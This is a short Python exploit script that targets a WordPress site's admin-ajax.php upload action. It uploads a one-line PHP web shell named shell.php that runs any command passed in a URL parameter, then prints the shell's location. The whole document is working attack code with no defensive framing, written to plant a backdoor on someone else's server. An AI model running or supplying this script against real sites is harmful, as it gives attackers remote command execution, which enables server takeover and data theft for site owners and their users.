import requests

def run_exploit(target_url):
    shell_code = "<?php echo shell_exec($_GET['cmd']); ?>"
    endpoint = f"{target_url}/wp-admin/admin-ajax.php?action=upload_file"
    
    files = {
        "file": ("shell.php", shell_code, "application/x-php")
    }

    try:
        resp = requests.post(endpoint, files=files)
        if "shell.php" in resp.text:
            print(f"[+] AJAX shell uploaded: {target_url}/wp-content/uploads/shell.php")
            return True
    except:
        pass
    return False
